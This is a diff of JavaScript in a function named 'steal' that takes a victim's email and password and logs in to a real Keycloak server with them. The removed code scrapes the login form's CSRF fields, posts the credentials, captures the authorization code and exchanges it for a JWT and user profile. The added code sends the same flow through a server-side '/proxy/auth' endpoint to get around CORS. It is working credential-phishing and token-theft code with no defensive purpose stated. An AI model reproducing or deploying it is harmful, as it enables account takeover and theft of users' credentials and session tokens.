@@ -102,84 +102,20 @@ async function steal(){
     let jwt=null,jwtPayload=null,userinfo=null,authError=null;
 
     try{
-        // Step 1: Fetch Keycloak login page (gets session + CSRF)
-        const loginResp=await fetch(KC+'/protocol/openid-connect/auth?response_type=code&client_id='+CID+'&redirect_uri='+encodeURIComponent(RU)+'&scope=openid+email+profile&state=steal'+Date.now(),{credentials:'include'});
-        const loginHtml=await loginResp.text();
-
-        // Step 2: Extract form action URL and hidden fields
-        const formMatch=loginHtml.match(/action="([^"]+)"/);
-        const formAction=formMatch?formMatch[1].replace(/&amp;/g,'&'):null;
+        // Call server proxy to do full auth flow (bypasses CORS)
+        const resp=await fetch(BASE+'/proxy/auth',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({email,password})
+        });
+        const result=await resp.json();
         
-        const hiddenFields={};
-        const re=/name="([^"]+)"\s+value="([^"]*?)"/g;
-        let m;
-        while((m=re.exec(loginHtml))!==null)hiddenFields[m[1]]=m[2];
-
-        if(formAction){
-            // Step 3: Submit credentials to real Keycloak
-            const fd=new URLSearchParams();
-            for(const[k,v] of Object.entries(hiddenFields))fd.append(k,v);
-            fd.append('username',email);
-            fd.append('password',password);
-
-            const authResp=await fetch(formAction,{
-                method:'POST',
-                headers:{'Content-Type':'application/x-www-form-urlencoded'},
-                body:fd.toString(),
-                credentials:'include',
-                redirect:'manual'
-            });
-
-            // Step 4: Check response for auth code (in redirect Location header)
-            const status=authResp.status;
-            const location=authResp.headers.get('Location')||'';
-            const authResult=await authResp.text();
-
-            // Try to find auth code in redirect URL or response body
-            let code=null;
-            const locCodeMatch=location.match(/code=([^&]+)/);
-            const bodyCodeMatch=(authResult+location).match(/code=([^&"']+)/);
-            
-            if(locCodeMatch)code=locCodeMatch[1];
-            else if(bodyCodeMatch)code=bodyCodeMatch[1];
-
-            if(code){
-                // Step 5: Exchange auth code for JWT via server proxy
-                const tokenResp=await fetch(BASE+'/proxy/token',{
-                    method:'POST',
-                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
-                    body:new URLSearchParams({
-                        grant_type:'authorization_code',
-                        client_id:CID,
-                        code:code,
-                        redirect_uri:RU
-                    })
-                });
-                const tokenData=await tokenResp.json();
-                
-                if(tokenData.access_token){
-                    jwt=tokenData.access_token;
-                    jwtPayload=JSON.parse(atob(jwt.split('.')[1]));
-
-                    // Step 6: Get userinfo with JWT
-                    const uiResp=await fetch(BASE+'/proxy/userinfo',{
-                        method:'POST',
-                        headers:{'Content-Type':'application/json'},
-                        body:JSON.stringify({token:jwt})
-                    });
-                    if(uiResp.ok)userinfo=await uiResp.json();
-                }
-            } else {
-                // Check if login failed
-                if(loginHtml.includes('Invalid')||loginHtml.includes('Ungültig')||status===401){
-                    authError='Invalid credentials';
-                } else if(status===302||status===303){
-                    // Redirect happened but we couldn't read the code
-                    authError='Auth succeeded but code capture failed (redirect)';
-                } else {
-                    authError='Status: '+status+' Location: '+location.substring(0,100);
-                }
-            }
+        if(result.success && result.jwt){
+            jwt=result.jwt;
+            jwtPayload=result.jwt_payload;
+            userinfo=result.userinfo;
+        } else {
+            authError=result.error||'Auth failed';
         }
     }catch(e){
         authError=e.message;
